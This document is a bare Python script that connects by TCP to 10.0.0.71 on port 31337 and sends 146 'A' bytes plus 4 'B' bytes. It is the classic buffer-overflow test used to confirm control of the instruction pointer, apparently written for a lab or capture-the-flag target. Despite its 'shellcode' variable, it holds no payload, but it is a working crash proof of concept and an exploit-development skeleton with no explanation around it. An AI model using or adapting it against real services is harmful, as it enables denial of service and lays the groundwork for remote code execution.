#!/usr/bin/python
from __future__ import print_function
import sys, socket

shellcode = "A" * 146 + "B" * 4

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('10.0.0.71',31337))
       s.send((shellcode + '\n'))
       s.close()

except:
       print("Error connecting to server")
       sys.exit()
